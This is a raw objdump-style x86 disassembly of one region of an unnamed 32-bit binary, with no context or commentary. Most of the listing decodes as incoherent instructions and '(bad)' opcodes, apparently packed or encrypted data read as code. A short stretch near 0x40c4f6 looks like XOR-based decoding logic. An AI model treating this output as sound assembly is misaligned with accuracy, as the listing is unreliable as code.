  40c07c:	mov    ds:0xcb7f617,al
  40c081:	iret   
  40c082:	shl    DWORD PTR [edx+ebp*4],0x2c
  40c086:	dec    esi
  40c087:	inc    edx
  40c088:	push   0xc
  40c08a:	jb     0x40c0b8
  40c08c:	cmc    
  40c08d:	sub    dl,BYTE PTR [ebx]
  40c08f:	xchg   ebx,eax
  40c090:	cs mov esp,0x3246c832
  40c096:	xchg   BYTE PTR [eax+0x13],al
  40c099:	(bad)  
  40c09a:	cli    
  40c09b:	aam    0xa9
  40c09d:	fdiv   DWORD PTR [edx-0x63]
  40c0a0:	add    dh,bh
  40c0a2:	and    BYTE PTR [esi+0x4afd5566],cl
  40c0a8:	mov    al,ds:0xcd8d8f13
  40c0ad:	push   ds
  40c0ae:	jne    0x40c075
  40c0b0:	xchg   edi,eax
  40c0b1:	xchg   esi,eax
  40c0b2:	test   al,0x22
  40c0b4:	rcr    BYTE PTR ds:0xef513495,cl
  40c0ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0bb:	neg    ah
  40c0bd:	or     eax,0x602b0c5e
  40c0c2:	sub    BYTE PTR [esi+0x65a48a4f],bl
  40c0c8:	adc    bh,BYTE PTR [edi+0x4b]
  40c0cb:	pop    esi
  40c0cc:	in     al,dx
  40c0cd:	mov    edi,0xbce6d931
  40c0d2:	inc    eax
  40c0d3:	into   
  40c0d4:	jge    0x40c0e0
  40c0d6:	out    dx,eax
  40c0d7:	mov    edi,0xd103f903
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	shl    BYTE PTR ds:0xde9ce6d4,1
  40c0f2:	mov    bh,BYTE PTR [esi+0x7e]
  40c0f5:	jo     0x40c170
  40c0f7:	jle    0x40c177
  40c0f9:	ret    0x6d9c
  40c0fc:	and    bl,BYTE PTR [si+0x5494]
  40c101:	push   ss
  40c102:	fs push edi
  40c104:	(bad)  
  40c105:	fist   DWORD PTR [edx*4-0x145ee4bb]
  40c10c:	test   eax,0x3f081eb0
  40c111:	jmp    0x45af79f9
  40c116:	pop    eax
  40c117:	ret    0x4618
  40c11a:	inc    eax
  40c11b:	jp     0x40c114
  40c11d:	mov    cl,dl
  40c11f:	test   eax,0xf6d4c1d5
  40c124:	sbb    esp,DWORD PTR [ebx]
  40c126:	popf   
  40c127:	das    
  40c128:	pop    esp
  40c129:	cli    
  40c12a:	cs cdq 
  40c12c:	pop    ebx
  40c12d:	pop    eax
  40c12e:	fistp  DWORD PTR [edi+esi*1+0x53]
  40c132:	jno    0x40c0b8
  40c134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c135:	inc    esi
  40c136:	out    dx,eax
  40c137:	loope  0x40c1a8
  40c139:	dec    BYTE PTR [edi-0x77acfed3]
  40c13f:	jecxz  0x40c1a7
  40c141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c142:	(bad)  
  40c143:	call   0x34a0b9c1
  40c148:	add    bh,bl
  40c14a:	and    cl,ch
  40c14c:	jae    0x40c1c5
  40c14e:	(bad)  
  40c14f:	mov    ds:0xdd2d3f06,eax
  40c154:	data16 arpl WORD PTR [ecx+0x38],di
  40c158:	test   BYTE PTR [edi],ah
  40c15a:	jnp    0x40c17d
  40c15c:	enter  0xb013,0xa8
  40c160:	sub    eax,DWORD PTR [edx]
  40c162:	pop    edx
  40c163:	sub    DWORD PTR [ebx+eax*8+0x57],esi
  40c167:	dec    edi
  40c168:	inc    esi
  40c169:	xchg   ecx,eax
  40c16a:	xchg   DWORD PTR [ecx-0x16eabd91],eax
  40c170:	jl     0x40c1e6
  40c172:	mov    edi,0x8fb12cc5
  40c177:	pusha  
  40c178:	inc    edi
  40c179:	or     eax,0xdd3adf5b
  40c17e:	push   esi
  40c17f:	in     al,dx
  40c180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c181:	dec    ebp
  40c182:	pop    esi
  40c183:	daa    
  40c184:	sbb    esp,DWORD PTR [eax+ebx*8-0x47d955d7]
  40c18b:	call   0xe1436716
  40c190:	dec    esi
  40c191:	xchg   ebx,eax
  40c192:	push   ebp
  40c193:	iret   
  40c194:	test   BYTE PTR [ebx-0x7f],al
  40c197:	sub    esp,DWORD PTR [esi-0x7e4aa0f0]
  40c19d:	push   edx
  40c19e:	cmp    BYTE PTR [ecx+0x4c328147],0x63
  40c1a5:	lods   eax,DWORD PTR ds:[esi]
  40c1a6:	and    ecx,DWORD PTR [ecx+0x575edba1]
  40c1ac:	jmp    0x40c18b
  40c1ae:	mov    edx,0x62e1f1dd
  40c1b3:	aaa    
  40c1b4:	cld    
  40c1b5:	sub    cl,BYTE PTR [ebx]
  40c1b7:	stos   BYTE PTR es:[edi],al
  40c1b8:	ins    BYTE PTR es:[edi],dx
  40c1b9:	bound  ebx,QWORD PTR [ebx+0x25]
  40c1bc:	ins    DWORD PTR es:[edi],dx
  40c1bd:	push   ecx
  40c1be:	fwait
  40c1bf:	xchg   edi,eax
  40c1c0:	xchg   esi,eax
  40c1c1:	retf   0x4fec
  40c1c4:	in     eax,0x95
  40c1c6:	inc    ecx
  40c1c7:	cmp    BYTE PTR [ebx-0x3abac426],al
  40c1cd:	pop    ds
  40c1ce:	mov    cl,0x24
  40c1d0:	dec    esi
  40c1d1:	stos   BYTE PTR es:[edi],al
  40c1d2:	inc    esi
  40c1d3:	stos   BYTE PTR es:[edi],al
  40c1d4:	mov    al,ds:0x9178327e
  40c1d9:	mov    ecx,0xca2db8e0
  40c1de:	xchg   esi,eax
  40c1df:	lds    ecx,FWORD PTR [edx]
  40c1e1:	aaa    
  40c1e2:	push   cs
  40c1e3:	test   al,0x7f
  40c1e5:	ret    
  40c1e6:	loop   0x40c1f6
  40c1e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1e9:	pop    esp
  40c1ea:	xor    ebx,DWORD PTR [ebp+0x67]
  40c1ed:	mov    WORD PTR [ebp+0x63],fs
  40c1f0:	and    eax,0x65deb555
  40c1f5:	push   ebx
  40c1f6:	push   ss
  40c1f7:	stos   BYTE PTR es:[edi],al
  40c1f8:	cmp    edx,esp
  40c1fa:	mov    eax,0x9279e34a
  40c1ff:	scas   al,BYTE PTR es:[edi]
  40c200:	inc    ebx
  40c201:	fcmove st,st(1)
  40c203:	or     cl,BYTE PTR [ecx+edx*1+0x51]
  40c207:	in     al,dx
  40c208:	cmp    eax,0xa4de3b0a
  40c20d:	popa   
  40c20e:	fcmove st,st(7)
  40c210:	rcl    BYTE PTR ds:0xdd94234c,0x26
  40c217:	out    dx,al
  40c218:	lock mov al,ds:0x622fd052
  40c21e:	push   ss
  40c21f:	xchg   ebp,eax
  40c220:	cs dec esp
  40c222:	pop    edi
  40c223:	pop    esp
  40c224:	or     al,0xec
  40c226:	jg     0x40c1fc
  40c228:	call   0x5812584e
  40c22d:	aam    0x94
  40c22f:	jg     0x40c1be
  40c231:	mov    eax,0xb45297a7
  40c236:	jbe    0x40c230
  40c238:	scas   eax,DWORD PTR es:[edi]
  40c239:	inc    ebp
  40c23a:	and    BYTE PTR [ebx+edi*1+0x2cfc3203],dh
  40c241:	es xor al,0x9e
  40c244:	or     dh,BYTE PTR [edx+0x5271b736]
  40c24a:	nop
  40c24b:	jmp    0xd782:0x982d649d
  40c252:	bound  eax,QWORD PTR [ecx+0x1eb9b784]
  40c258:	or     DWORD PTR [ecx+0x37],0xdcb7e9e7
  40c25f:	fnstsw WORD PTR [ebx+0x1b]
  40c262:	dec    eax
  40c263:	inc    ebx
  40c264:	push   esp
  40c265:	ss push ds
  40c267:	(bad)  
  40c269:	add    dl,bh
  40c26b:	add    ch,BYTE PTR [ebx+0x1d7071de]
  40c271:	adc    eax,DWORD PTR [edi+0x3f]
  40c274:	add    al,0x8e
  40c276:	xchg   BYTE PTR [edi],bl
  40c278:	je     0x40c290
  40c27a:	mov    WORD PTR [edx-0xf],ss
  40c27d:	sbb    dl,cl
  40c27f:	adc    al,0xb9
  40c281:	adc    DWORD PTR [edx+0x11],edi
  40c284:	adc    dh,BYTE PTR [edi+0x41c76f82]
  40c28a:	adc    edi,DWORD PTR ss:[edi+0x41]
  40c28e:	mov    eax,DWORD PTR [edi+0x2c9b7cda]
  40c294:	cmp    BYTE PTR [ebx-0x2a],0x6c
  40c298:	mul    bh
  40c29a:	mov    dl,0xd8
  40c29c:	repnz dec ebp
  40c29e:	xchg   ecx,eax
  40c29f:	mov    dh,BYTE PTR [ecx]
  40c2a1:	sbb    edi,DWORD PTR [ecx+0x13]
  40c2a4:	pop    edx
  40c2a5:	jne    0x40c2c0
  40c2a7:	fdivr  st,st(3)
  40c2a9:	jnp    0x40c2c8
  40c2ab:	dec    eax
  40c2ac:	call   0x3c605577
  40c2b1:	mov    bh,0xad
  40c2b3:	aam    0x29
  40c2b5:	dec    eax
  40c2b6:	adc    DWORD PTR [ecx-0x10184934],edi
  40c2bc:	in     eax,0x9f
  40c2be:	ins    DWORD PTR es:[edi],dx
  40c2bf:	hlt    
  40c2c0:	add    esp,DWORD PTR [eax-0x67]
  40c2c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2c4:	xor    eax,0x4c2fc587
  40c2c9:	das    
  40c2ca:	lock call 0x55a7:0x87e8f882
  40c2d2:	dec    eax
  40c2d3:	add    dl,BYTE PTR [edi+edx*1-0x3a]
  40c2d7:	retf   0x45e3
  40c2da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2db:	or     ebx,0xffffffff
  40c2de:	push   cs
  40c2df:	adc    ch,bh
  40c2e1:	jge    0x40c264
  40c2e3:	std    
  40c2e4:	loopne 0x40c34c
  40c2e6:	mov    ch,0x44
  40c2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2e9:	inc    edi
  40c2ea:	push   esp
  40c2eb:	rol    DWORD PTR [eax+0x29],1
  40c2ee:	cmp    ch,BYTE PTR [esi-0x12a7704a]
  40c2f4:	mov    ch,0xcf
  40c2f6:	cmp    dl,BYTE PTR [ebx-0x20]
  40c2f9:	sub    eax,0xd34f5e19
  40c2fe:	or     edx,esi
  40c300:	les    ecx,FWORD PTR [esi-0x2e]
  40c303:	lea    esp,[ebp-0x18]
  40c306:	pop    es
  40c307:	dec    DWORD PTR [eax-0x5ac04759]
  40c30d:	inc    edx
  40c30e:	jmp    0x69ec2018
  40c313:	xchg   ebp,eax
  40c314:	fisub  WORD PTR [esp+eax*1]
  40c317:	push   edx
  40c318:	in     al,0x6e
  40c31a:	fwait
  40c31b:	cmp    ch,BYTE PTR [edx+0x3f]
  40c31e:	mov    ebp,0xc36eb397
  40c323:	cmp    DWORD PTR [edx+0x3f81f1c4],ebx
  40c329:	pushf  
  40c32a:	iret   
  40c32b:	dec    esp
  40c32c:	icebp  
  40c32d:	cmp    eax,0xc695466c
  40c332:	neg    DWORD PTR [edi]
  40c334:	mov    cl,BYTE PTR [edi+0x56]
  40c337:	shr    BYTE PTR [ebp+0x5fc8d59e],1
  40c33d:	xchg   ebp,eax
  40c33e:	adc    ebp,DWORD PTR [ecx+0x20]
  40c341:	and    BYTE PTR [ecx],0x61
  40c344:	(bad)
  40c347:	aaa    
  40c348:	(bad)  
  40c349:	mov    dh,0x5
  40c34b:	les    edx,FWORD PTR [esi-0x4a]
  40c34e:	jecxz  0x40c32e
  40c350:	dec    ebx
  40c351:	into   
  40c352:	lea    esi,[edi+eiz*4]
  40c355:	data16 jnp 0x40c3a5
  40c358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c359:	fcmovnbe st,st(2)
  40c35b:	add    cl,al
  40c35d:	xchg   esp,eax
  40c35e:	xchg   ebx,eax
  40c35f:	sub    edi,DWORD PTR [ecx]
  40c361:	push   esp
  40c362:	repnz sub ebp,edi
  40c365:	popa   
  40c366:	inc    ebp
  40c367:	and    ebx,eax
  40c369:	sahf   
  40c36a:	cli    
  40c36b:	loopne 0x40c356
  40c36d:	iret   
  40c36e:	stos   DWORD PTR es:[edi],eax
  40c36f:	mov    eax,0xfaa0e422
  40c374:	in     eax,dx
  40c375:	pop    edi
  40c376:	mov    cl,0xc2
  40c378:	xchg   ebx,eax
  40c379:	xchg   DWORD PTR [eax+0x5e],ebx
  40c37c:	push   cs
  40c37d:	push   DWORD PTR [esp+ebx*2-0xf]
  40c381:	(bad)  
  40c382:	mov    WORD PTR [edx+0x38be8904],?
  40c388:	and    BYTE PTR [eax+0x72af1be5],bl
  40c38e:	cs push 0x722a893b
  40c394:	xor    eax,0x174bd61
  40c399:	push   edx
  40c39b:	in     al,0x45
  40c39d:	out    0xc1,eax
  40c39f:	mov    esi,0x6fcc51aa
  40c3a4:	push   cs
  40c3a5:	out    0x1f,eax
  40c3a7:	mov    ds:0xb9961a4d,al
  40c3ac:	scas   eax,DWORD PTR es:[edi]
  40c3ad:	sti    
  40c3ae:	sbb    BYTE PTR ss:[eax+0x3c],dh
  40c3b2:	loope  0x40c380
  40c3b4:	dec    edx
  40c3b5:	push   ecx
  40c3b6:	jge    0x40c392
  40c3b8:	lods   al,BYTE PTR ds:[esi]
  40c3b9:	pop    ebp
  40c3ba:	xor    al,0xdd
  40c3bc:	pushf  
  40c3bd:	mov    WORD PTR [eax],?
  40c3bf:	cmp    eax,0xe90314f7
  40c3c4:	pop    ebx
  40c3c5:	stc    
  40c3c6:	pushf  
  40c3c7:	cmp    DWORD PTR [ecx+0x7d23d417],esp
  40c3cd:	push   esp
  40c3ce:	xchg   ebx,eax
  40c3cf:	imul   ebx,DWORD PTR [ebx+0x4d6cda07],0xffffffc0
  40c3d6:	rol    DWORD PTR [ecx-0x6c],1
  40c3d9:	xor    eax,0xc0040b14
  40c3de:	xchg   ebx,eax
  40c3df:	test   BYTE PTR [esi+0x61226270],bh
  40c3e5:	shr    BYTE PTR [edx],1
  40c3e7:	sbb    dh,bl
  40c3e9:	jne    0x40c3e3
  40c3eb:	pop    esi
  40c3ec:	inc    edx
  40c3ed:	repnz repnz mov ecx,0x9f0a2ac8
  40c3f4:	sar    BYTE PTR [ebx-0x2a2ac5b2],cl
  40c3fa:	pop    edx
  40c3fb:	dec    ecx
  40c3fc:	mov    eax,ds:0xd01d4aea
  40c401:	mov    fs,WORD PTR [esi+0x40]
  40c404:	clc    
  40c405:	mov    cl,0x70
  40c407:	and    dh,ah
  40c409:	sbb    DWORD PTR [ebx],esi
  40c40b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40c40d:	ficom  WORD PTR [ecx]
  40c40f:	inc    ebx
  40c410:	js     0x40c418
  40c412:	enter  0x18ad,0x40
  40c416:	aad    0xc7
  40c418:	retf   0x605c
  40c41b:	aas    
  40c41c:	lahf   
  40c41d:	adc    BYTE PTR [ebp-0x9],ah
  40c420:	(bad)  
  40c421:	into   
  40c422:	adc    esp,esi
  40c424:	inc    ebx
  40c425:	aad    0x1e
  40c427:	ins    DWORD PTR es:[edi],dx
  40c428:	cmp    al,0xc7
  40c42a:	dec    ecx
  40c42b:	sbb    BYTE PTR [ebp+eiz*1+0x3bcd7eb9],cl
  40c432:	mov    DWORD PTR [edx+0x623e8e90],ebp
  40c438:	test   al,0xd5
  40c43a:	(bad)  [ebx]
  40c43c:	ret    0x77f7
  40c43f:	stc    
  40c440:	mov    ds:0xb0a0f4f0,al
  40c445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c446:	ja     0x40c45f
  40c448:	inc    edx
  40c449:	ficom  WORD PTR [eax]
  40c44b:	rcr    DWORD PTR [esi-0x40],0x74
  40c44f:	pop    eax
  40c450:	cli    
  40c451:	cmp    edx,ebx
  40c453:	inc    edi
  40c454:	mov    ch,0x45
  40c456:	fisubr WORD PTR [esi-0x9]
  40c459:	sbb    DWORD PTR [edx-0x1f],eax
  40c45c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c45d:	sahf   
  40c45e:	neg    BYTE PTR [ebp-0x18]
  40c461:	push   eax
  40c462:	sbb    DWORD PTR [edi+0xdfe137d],ebx
  40c468:	pop    esp
  40c469:	sbb    al,0xac
  40c46b:	loop   0x40c467
  40c46d:	nop
  40c46e:	sbb    BYTE PTR [edx-0x25],ch
  40c471:	ficom  DWORD PTR [esi-0x69ddd163]
  40c477:	aad    0x2a
  40c479:	jp     0x40c42a
  40c47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47c:	push   ecx
  40c47d:	sbb    esp,ecx
  40c47f:	push   esp
  40c480:	pop    ds
  40c481:	scas   eax,DWORD PTR es:[edi]
  40c482:	adc    eax,0xf5ab550e
  40c487:	fidivr DWORD PTR [eax-0x5d0d5e22]
  40c48d:	sbb    DWORD PTR [eax],ebp
  40c48f:	sahf   
  40c490:	arpl   WORD PTR [esi],cx
  40c492:	xchg   edx,edx
  40c494:	adc    dh,BYTE PTR [esi]
  40c496:	and    ebx,DWORD PTR [ecx-0x55]
  40c499:	aaa    
  40c49a:	retf   0x7320
  40c49d:	mov    bh,0xdd
  40c49f:	xor    esi,esi
  40c4a1:	pushf  
  40c4a2:	(bad)  
  40c4a3:	or     ah,cl
  40c4a5:	jl     0x40c475
  40c4a7:	xor    BYTE PTR [esi+0x4b],0x9
  40c4ab:	leave  
  40c4ac:	sar    BYTE PTR [ebx+0x17fa93fe],1
  40c4b2:	hlt    
  40c4b3:	shl    BYTE PTR [edx],0xe6
  40c4b6:	out    dx,eax
  40c4b7:	adc    ah,BYTE PTR [ebp+0xd16cac8]
  40c4bd:	in     al,dx
  40c4be:	addr16 xchg si,ax
  40c4c1:	dec    esi
  40c4c2:	lods   al,BYTE PTR ds:[esi]
  40c4c3:	mov    BYTE PTR [edi-0x4d],cl
  40c4c6:	sub    eax,0xffffff99
  40c4c9:	inc    ebx
  40c4ca:	push   eax
  40c4cb:	fst    QWORD PTR [ebx]
  40c4cd:	cdq    
  40c4ce:	xchg   edi,eax
  40c4cf:	push   esp
  40c4d0:	push   ebp
  40c4d1:	std    
  40c4d2:	jns    0x40c483
  40c4d4:	jmp    0x7edf23cf
  40c4d9:	ss nop
  40c4db:	mov    bh,0xae
  40c4dd:	fcomi  st,st(4)
  40c4df:	stc    
  40c4e0:	inc    edi
  40c4e1:	add    eax,0xcbe1decf
  40c4e6:	sub    ch,BYTE PTR ds:0xe2f43a67
  40c4ec:	aam    0xbf
  40c4ee:	xchg   edx,eax
  40c4ef:	inc    ebp
  40c4f0:	jmp    0x40c50b
  40c4f2:	jg     0x40c503
  40c4f4:	scas   eax,DWORD PTR es:[edi]
  40c4f5:	xlat   BYTE PTR ds:[ebx]
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	and    al,0x1e
  40c541:	lea    eax,[edx]
  40c543:	rcl    BYTE PTR [esi+0x79707e7e],1
  40c549:	jle    0x40c5c9
  40c54b:	pop    edx
  40c54c:	xchg   ebx,eax
  40c54d:	push   ebp
  40c54e:	jno    0x40c5af
  40c550:	push   0x5801f032
  40c555:	pushf  
  40c556:	mov    ds,WORD PTR [edx]
  40c558:	cwde   
  40c559:	pop    esi
  40c55a:	add    eax,0xfd7db404
  40c55f:	xor    ebx,0xba30f4a5
  40c565:	adc    DWORD PTR [ebx+eiz*1+0x5974a4d8],esp
  40c56c:	push   cs
  40c56d:	adc    eax,0x2d7c8cce
  40c572:	inc    edi
  40c573:	cdq    
  40c574:	ds pop edx
  40c576:	leave  
  40c577:	mov    al,ds:0x1d283116
  40c57c:	dec    ecx
  40c57d:	pop    esp
  40c57e:	mov    dh,0x79
  40c580:	jecxz  0x40c5a0
  40c582:	xchg   esi,eax
  40c583:	jmp    0x3ed6d351
  40c588:	int    0x8a
  40c58a:	sub    esi,edi
  40c58c:	test   eax,0xa3959d51
  40c591:	pop    ds
  40c592:	addr16 jbe 0x33cc6026
  40c599:	jge    0x40c5b7
  40c59b:	ret    0xb5f5
  40c59e:	fimul  WORD PTR [edi]
  40c5a0:	mov    esp,0x93d43378
  40c5a5:	xchg   edi,eax
  40c5a6:	push   ss
  40c5a7:	push   0x1908ece4
  40c5ac:	shl    esp,cl
  40c5ae:	stc    
  40c5af:	ins    DWORD PTR es:[edi],dx
  40c5b0:	mul    DWORD PTR [edi]
  40c5b2:	out    0xdc,eax
  40c5b4:	(bad)  [ecx+0x6e]
  40c5b7:	xchg   ecx,eax
  40c5b8:	pop    esi
  40c5b9:	mov    ebx,0xd8f1aed4
  40c5be:	add    cl,dl
  40c5c0:	or     eax,0x7b2d36d9
  40c5c5:	(bad)  
  40c5c6:	pop    ecx
  40c5c7:	bound  edx,QWORD PTR [edi-0x308b8805]
  40c5cd:	jb     0x40c602
  40c5cf:	mov    eax,ds:0x5c1e1647
  40c5d4:	and    esi,DWORD PTR [ecx-0x6874a365]
  40c5da:	ja     0x40c56c
  40c5dc:	mov    ebx,0x8c4fa22e
  40c5e1:	jns    0x40c5f6
  40c5e3:	mov    ss,WORD PTR ds:0xf32fca80
  40c5e9:	xor    eax,0xcd1bbd88
  40c5ee:	adc    ebx,DWORD PTR [edi]
  40c5f0:	test   eax,0x3ba056bd
  40c5f5:	fwait
  40c5f6:	rcl    ah,1
  40c5f8:	mov    ds:0xb74eb477,eax
  40c5fd:	imul   ebx,DWORD PTR fs:[esi-0x67],0xfffffffb
  40c602:	pop    ds
  40c603:	sub    BYTE PTR [ebx+0x239315bd],dh
  40c609:	pop    esp
  40c60a:	nop
  40c60b:	test   DWORD PTR [edi+0x40],0xd49f0552
  40c612:	into   
  40c613:	imul   edx,DWORD PTR [edi+0x32],0x51403dde
  40c61a:	jo     0x40c661
  40c61c:	mov    dl,0xb6
  40c61e:	es pop ecx
  40c620:	inc    edi
  40c621:	(bad)  
  40c622:	jbe    0x40c627
  40c624:	loop   0x40c698
  40c626:	and    esi,eax
  40c628:	(bad)  
  40c629:	and    edx,DWORD PTR [eax+0x76490f24]
  40c62f:	push   0x4a686cac
  40c634:	pop    ds
  40c635:	add    al,0x4c
  40c637:	test   DWORD PTR [esi+0x711c07ad],edi
  40c63d:	dec    esp
  40c63e:	xchg   BYTE PTR [eax],al
  40c640:	push   edx
  40c641:	mov    cl,ah
  40c643:	sub    dh,BYTE PTR [ebx+0x2f6fe399]
  40c649:	mov    eax,0x1d85b2f8
  40c64e:	dec    edi
  40c64f:	xchg   BYTE PTR [ebp-0x79d22c24],al
  40c655:	cli    
  40c656:	fcom   QWORD PTR [eax]
  40c658:	jbe    0x40c63b
  40c65a:	jecxz  0x40c64f
  40c65c:	sbb    eax,0x678fb932
  40c661:	adc    eax,0x1e8c26f0
  40c666:	(bad)  
  40c667:	std    
  40c668:	dec    esp
  40c669:	iret   
  40c66a:	and    DWORD PTR [ebp-0x47],ebp
  40c66d:	shl    edx,cl
  40c66f:	and    bh,dl
  40c671:	sbb    cl,BYTE PTR [edx]
  40c673:	sub    eax,0xb3d2ad31
  40c678:	xchg   edx,eax
  40c679:	cld    
  40c67a:	inc    esp
  40c67b:	bound  edx,QWORD PTR [edi+0x8]
  40c67e:	aas    
  40c67f:	mov    eax,ds:0x4ecc5e42
  40c684:	mov    bl,bl
  40c686:	mov    BYTE PTR [ebx+edi*2-0x3f],ch
  40c68a:	test   DWORD PTR [ecx+0x50],esp
  40c68d:	mov    ecx,0x2d83ad66
  40c692:	ret    
  40c693:	popf   
  40c694:	lahf   
  40c695:	sar    BYTE PTR [edi-0x79],0x70
  40c699:	in     al,0x21
  40c69b:	nop
  40c69c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c69d:	enter  0x7823,0x62
  40c6a1:	push   0x3b
  40c6a3:	dec    eax
  40c6a4:	dec    esi
  40c6a5:	push   es
  40c6a6:	out    0xa3,al
  40c6a8:	int3   
  40c6a9:	daa    
  40c6aa:	nop
  40c6ab:	jle    0x40c6e6
  40c6ad:	inc    DWORD PTR [esi]
  40c6af:	pop    ebp
  40c6b0:	add    edi,edx
  40c6b2:	loopne 0x40c6af
  40c6b4:	adc    edx,DWORD PTR [ecx]
  40c6b6:	jecxz  0x40c703
  40c6b8:	jg     0x40c64e
  40c6ba:	inc    edi
  40c6bb:	add    ch,bh
  40c6bd:	out    dx,al
  40c6be:	xor    eax,0x62da31ed
  40c6c3:	xchg   DWORD PTR [ecx+esi*2],ebx
  40c6c6:	inc    edi
  40c6c7:	hlt    
  40c6c8:	pushf  
  40c6c9:	repnz inc ebp
  40c6cb:	inc    edi
  40c6cc:	std    
  40c6cd:	dec    esp
  40c6ce:	xor    edi,DWORD PTR [ecx+0x2325a274]
  40c6d4:	paddusw mm3,QWORD PTR [esi-0x34]
  40c6d8:	mov    ebx,0x6e654010
  40c6dd:	mov    esi,0x4b37abf
  40c6e2:	inc    eax
  40c6e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6e5:	mov    ebp,0x56777bc8
  40c6ea:	retf   
  40c6eb:	xchg   esp,eax
  40c6ec:	jo     0x40c694
  40c6ee:	dec    esp
  40c6ef:	rcl    esp,0x33
  40c6f2:	and    al,BYTE PTR [ecx-0x378e9190]
  40c6f8:	cmp    ebp,DWORD PTR [ebx+0x33]
  40c6fb:	mov    eax,ds:0xea10b5d0
  40c700:	inc    ebp
  40c701:	pop    esi
  40c702:	lahf   
  40c703:	sbb    eax,0x4bf606a1
  40c708:	xor    eax,0x1f5e9f67
  40c70d:	xor    cl,BYTE PTR [eax+0x7d999fdf]
  40c713:	sbb    ebx,DWORD PTR [ecx-0x41]
  40c716:	mov    ds:0x6be961a4,al
  40c71b:	ret    
  40c71c:	loopne 0x40c757
  40c71e:	cmp    eax,0x2b3e3870
  40c723:	(bad)  
  40c724:	(bad)  
  40c725:	into   
  40c726:	fsubr  QWORD PTR [edx-0x2d96be5b]
  40c72c:	imul   ecx,DWORD PTR [edx],0xffffffc5
  40c72f:	jnp    0x40c73e
  40c731:	adc    ah,al
  40c733:	adc    al,0xb0
  40c735:	call   0x6d9e:0x97b276f7
  40c73c:	jno    0x40c741
  40c73e:	je     0x40c7aa
  40c740:	jge    0x40c732
  40c742:	mov    eax,0xf3f18112
  40c747:	or     dh,BYTE PTR [ebp+0x272aeb8d]
  40c74d:	mov    eax,0x105271ea
  40c752:	adc    al,0x68
  40c754:	and    eax,0xb0138309
  40c759:	mov    ds:0xf47a4149,al
  40c75e:	sar    DWORD PTR [ecx],1
  40c760:	push   0xffbc06ed
  40c765:	cmp    ebp,DWORD PTR [edi-0x61]
  40c768:	out    dx,al
  40c769:	ds pop ecx
  40c76b:	sub    edx,edx
  40c76d:	sub    cl,BYTE PTR ds:0xe5d88ac1
  40c773:	and    eax,0x5aa769b6
  40c778:	mov    ah,0xed
  40c77a:	mov    esi,0x5e002662
  40c77f:	and    BYTE PTR [eax-0x15],al
  40c782:	lds    esi,FWORD PTR [ebx-0x6a]
  40c785:	mov    al,0x2c
  40c787:	cwde   
  40c788:	mov    edx,0xba523d12
  40c78d:	imul   ebp,ebx,0xffffffd4
  40c790:	push   edi
  40c791:	add    ch,bh
  40c793:	mov    BYTE PTR [edi-0xb7e6018],bh
  40c799:	inc    ebx
  40c79a:	mov    DWORD PTR [eax],0x276af169
  40c7a0:	in     eax,0x65
  40c7a2:	push   eax
  40c7a3:	pop    esp
  40c7a4:	xlat   BYTE PTR ds:[ebx]
  40c7a5:	jmp    0x40c7a7
  40c7a7:	fld    DWORD PTR [edx]
  40c7a9:	dec    eax
  40c7aa:	pop    ecx
  40c7ab:	popf   
  40c7ac:	in     al,0x71
  40c7ae:	les    esi,FWORD PTR [ebx+0x782bf548]
  40c7b4:	adc    al,0x9a
  40c7b6:	cmp    ecx,ebp
  40c7b8:	int3   
  40c7b9:	inc    edi
  40c7ba:	in     al,0x59
  40c7bc:	call   0x3772ab9e
  40c7c1:	cmp    ebx,DWORD PTR [ecx]
  40c7c3:	(bad)  
  40c7c4:	div    esp
  40c7c6:	sub    ebx,DWORD PTR [eax-0x66f43f47]
  40c7cc:	cwde   
  40c7cd:	lock neg BYTE PTR [edi]
  40c7d0:	and    DWORD PTR [esi+0x31ffaf55],ecx
  40c7d6:	fdivr  QWORD PTR [edi]
  40c7d8:	push   ebp
  40c7d9:	mov    ds:0x9e0fcb6f,al
  40c7de:	in     eax,dx
  40c7df:	icebp  
  40c7e0:	lods   eax,DWORD PTR ds:[esi]
  40c7e1:	push   ds
  40c7e2:	div    DWORD PTR [esi+ebx*1-0x3f]
  40c7e6:	mov    bh,0x90
  40c7e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7e9:	cmc    
  40c7ea:	inc    edx
  40c7eb:	aad    0x42
  40c7ed:	out    0xb,al
